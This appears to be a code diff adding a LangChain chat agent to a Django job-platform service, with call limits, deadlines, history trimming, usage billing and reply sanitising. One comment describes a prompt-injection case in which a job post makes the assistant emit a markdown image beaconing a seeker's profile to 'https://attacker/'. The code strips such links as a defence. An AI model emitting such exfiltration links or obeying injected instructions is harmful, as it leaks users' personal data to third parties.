@@ -1,6 +1,7 @@
 """Service layer for AI features. Views translate domain exceptions to HTTP."""
 import base64
 import logging
+import re
 import time
 
 from django.core.exceptions import ValidationError  # malformed UUID -> 404, not 500
@@ -11,23 +12,35 @@ from apps.jobs.models import JobPost, JobPostActivity
 from apps.seekers.models import SkillSet
 
 from .exceptions import (
+    AgentLimitExceededError,
     AIProviderError,
     AIQuotaExceededError,
     AIResponseInvalidError,
     CompanyProfileMissingError,
+    ConversationExhaustedError,
+    ConversationNotFoundError,
     InvalidResumeFileError,
     JobPostNotFoundError,
     NoApplicantsError,
     ScreeningPermissionError,
 )
 from .llm import get_model
-from .models import AIUsageLog, ScreeningReport
+from .models import AIUsageLog, Conversation, ScreeningReport
 from .prompts import (
+    CHAT_SYSTEM,
     build_job_post_writer_prompt,
     build_resume_import_messages,
     build_screening_prompt,
 )
 from .schemas import JobPostDraft, ResumeExtract, ScreeningResult
+
+from langchain.agents import create_agent
+from langchain.agents.middleware import ModelCallLimitMiddleware, wrap_model_call
+from langchain.agents.middleware.model_call_limit import ModelCallLimitExceededError
+from langchain_core.messages import AIMessage, HumanMessage, trim_messages
+
+from .checkpointer import get_checkpointer
+from .tools import build_tools
 
 logger = logging.getLogger('apps.ai')
 
@@ -430,3 +443,205 @@ def screen_applicants(user, *, job_post_id, refresh=False, model=None):
         created_at=run_started,
     )
     return _screening_response(job_post, report, cached=False)
+
+
+CONVERSATION_TITLE_CHARS = 60
+# One turn may legitimately need several model calls (search, then details,
+# then an answer). Eight is generous for that and still bounds a runaway loop.
+MAX_MODEL_CALLS_PER_TURN = 8
+# A whole conversation's ceiling — a single long-lived thread must not become
+# an unbounded bill. Cumulative and checkpointed: once reached, the thread is
+# finished for good, which is why it maps to its own exception.
+MAX_MODEL_CALLS_PER_THREAD = 60
+# How many messages the model SEES. Full history stays in the checkpoint.
+CHAT_HISTORY_MESSAGES = 20
+CHAT_DEADLINE_SECONDS = 90
+CHAT_MODEL_TIMEOUT_SECONDS = 60
+# A free-form completion has no schema bounding it, unlike the structured
+# services — so cap the output explicitly.
+CHAT_MAX_OUTPUT_TOKENS = 1024
+
+# Markdown images/links and bare URLs are stripped from the reply. A job
+# description is company-authored text that reaches the model, so it can ask
+# the assistant to emit ![](https://attacker/?d=<the seeker's profile>); a
+# client rendering that markdown would beacon the seeker's data to the post's
+# author. The system prompt also forbids it — this is the enforcement.
+_MD_IMAGE_RE = re.compile(r'!\[[^\]]*\]\([^)]*\)')
+_MD_LINK_RE = re.compile(r'\[([^\]]*)\]\([^)]*\)')
+_BARE_URL_RE = re.compile(r'\b(?:https?|ftp|data)://\S+', re.IGNORECASE)
+
+
+class _ChatDeadlineExceeded(Exception):
+    """Internal: wall-clock bound hit between model calls."""
+
+
+def _sanitize_reply(text):
+    """Drop links/images, keep their visible text. See _MD_IMAGE_RE above."""
+    text = _MD_IMAGE_RE.sub('', text)
+    text = _MD_LINK_RE.sub(r'\1', text)
+    text = _BARE_URL_RE.sub('', text)
+    return re.sub(r'[ \t]{2,}', ' ', text).strip()
+
+
+def _turn_usage(messages):
+    """Tokens spent on THIS turn only.
+
+    agent.invoke() returns the entire thread, so summing the whole list
+    re-bills every previous turn. Each turn appends exactly one HumanMessage,
+    so everything after the last one is this turn's work. This stays correct
+    after a failed turn, which still persists its HumanMessage.
+    """
+    indexes = [i for i, m in enumerate(messages) if isinstance(m, HumanMessage)]
+    tail = messages[indexes[-1] + 1:] if indexes else messages
+    totals = {'input_tokens': 0, 'output_tokens': 0}
+    for message in tail:
+        if isinstance(message, AIMessage) and message.usage_metadata:
+            totals['input_tokens'] += message.usage_metadata.get('input_tokens', 0)
+            totals['output_tokens'] += message.usage_metadata.get('output_tokens', 0)
+    return totals
+
+
+def _stored_messages(checkpointer, config):
+    """Messages currently in the thread, or [] if it has none."""
+    try:
+        snapshot = checkpointer.get_tuple(config)
+    except Exception:  # pragma: no cover - bookkeeping must not mask the error
+        return []
+    if snapshot is None:
+        return []
+    return snapshot.checkpoint.get('channel_values', {}).get('messages', [])
+
+
+def _build_chat_agent(model, tools, checkpointer, deadline_at):
+    """create_agent with the three bounds this endpoint needs."""
+
+    @wrap_model_call
+    def _trim_history(request, handler):
+        # Cap what the model SEES, not what is stored. Returning a subset from
+        # a @before_model hook would do nothing: the messages channel uses the
+        # add_messages reducer, which appends and dedupes by id.
+        #
+        # trim_messages rather than request.messages[-N:]: a raw slice can open
+        # the window on a ToolMessage whose parent AIMessage was cut, and
+        # Gemini rejects a functionResponse with no preceding functionCall.
+        # start_on='human' guarantees the window opens on a clean turn.
+        if len(request.messages) > CHAT_HISTORY_MESSAGES:
+            request = request.override(messages=trim_messages(
+                request.messages,
+                max_tokens=CHAT_HISTORY_MESSAGES,
+                token_counter=len,
+                strategy='last',
+                start_on='human',
+                include_system=False,
+            ))
+        return handler(request)
+
+    @wrap_model_call
+    def _enforce_deadline(request, handler):
+        # Checked between model calls: a turn that keeps calling tools cannot
+        # run forever even while every individual call stays under its timeout.
+        # Interrupting a blocking call would need threads or signals, neither
+        # safe under a WSGI worker.
+        if time.monotonic() > deadline_at:
+            raise _ChatDeadlineExceeded()
+        return handler(request)
+
+    return create_agent(
+        model,
+        tools=tools,
+        system_prompt=CHAT_SYSTEM,
+        checkpointer=checkpointer,
+        middleware=[
+            _enforce_deadline,
+            _trim_history,
+            # exit_behavior='error' is essential. The default 'end' appends a
+            # synthetic AIMessage reading "Model call limits exceeded: run
+            # limit (8/8)" — which would be returned to the user as their reply.
+            ModelCallLimitMiddleware(
+                run_limit=MAX_MODEL_CALLS_PER_TURN,
+                thread_limit=MAX_MODEL_CALLS_PER_THREAD,
+                exit_behavior='error'),
+        ],
+    )
+
+
+def send_chat_message(user, *, message, conversation_id=None, model=None,
+                      checkpointer=None):
+    """One chat turn. Returns {'conversation_id': str, 'reply': str}.
+
+    Read-only with respect to the domain: the agent's tools cannot write, so
+    the only rows this creates are the Conversation and one AIUsageLog.
+    """
+    created_now = False
+    if conversation_id:
+        try:
+            # Ownership lives in the query, not in a check afterwards — there is
+            # no point at which another user's thread has been loaded.
+            conversation = Conversation.objects.get(id=conversation_id, user=user)
+        except (Conversation.DoesNotExist, ValidationError, ValueError, TypeError):
+            raise ConversationNotFoundError()
+    else:
+        conversation = Conversation.objects.create(
+            user=user, title=message[:CONVERSATION_TITLE_CHARS])
+        created_now = True
+
+    model = model or get_model('pro', timeout=CHAT_MODEL_TIMEOUT_SECONDS,
+                               max_output_tokens=CHAT_MAX_OUTPUT_TOKENS)
+    checkpointer = checkpointer or get_checkpointer()
+    started = time.monotonic()
+    agent = _build_chat_agent(
+        model, build_tools(user), checkpointer, started + CHAT_DEADLINE_SECONDS)
+
+    config = {'configurable': {'thread_id': str(conversation.id)}}
+    try:
+        state = agent.invoke({'messages': [('user', message)]}, config=config)
+    except BaseException as exc:
+        # Tokens were spent before this raised — the run-limit path has made
+        # MAX_MODEL_CALLS_PER_TURN billed Pro calls. Read the partial turn back
+        # out of the checkpoint and bill it BEFORE any rollback destroys it.
+        _record_turn_usage(user, model, _stored_messages(checkpointer, config), started)
+        _rollback_new_conversation(conversation, checkpointer, created_now)
+        if isinstance(exc, ModelCallLimitExceededError):
+            # thread_limit is cumulative and checkpointed: hitting it means the
+            # thread can never answer again, which is a different fact about
+            # the world than "this turn ran long".
+            if exc.thread_limit is not None and exc.thread_count >= exc.thread_limit:
+                raise ConversationExhaustedError()
+            raise AgentLimitExceededError()
+        if isinstance(exc, _ChatDeadlineExceeded):
+            raise AgentLimitExceededError()
+        raise _classify_provider_error(exc)
+
+    _record_turn_usage(user, model, state['messages'], started)
+
+    # .text, not .content: content is str | list[block] and a Pro/thinking
+    # model can return blocks, which would break the declared string contract.
+    reply = _sanitize_reply(state['messages'][-1].text) if state['messages'] else ''
+    # Ids and sizes only — never the message body (privacy rule).
+    logger.info('ai chat conversation=%s messages=%s reply_chars=%s',
+                conversation.id, len(state['messages']), len(reply))
+    return {'conversation_id': str(conversation.id), 'reply': reply}
+
+
+def _record_turn_usage(user, model, messages, started):
+    """One AIUsageLog row for this turn — on the failure path too."""
+    _record_usage(AIUsageLog.Feature.CHAT, user, model, [{
+        'usage': _turn_usage(messages),
+        'latency_ms': int((time.monotonic() - started) * 1000),
+    }])
+
+
+def _rollback_new_conversation(conversation, checkpointer, created_now):
+    """Drop a conversation that was created for this call and never answered.
+
+    Without this, a client retrying a failing request accumulates one empty
+    conversation per attempt. An existing conversation is never touched.
+    """
+    if not created_now:
+        return
+    try:
+        checkpointer.delete_thread(str(conversation.id))
+    except Exception:  # pragma: no cover - best effort; the row still goes
+        logger.warning('ai chat rollback: thread delete failed conversation=%s',
+                       conversation.id)
+    conversation.delete()
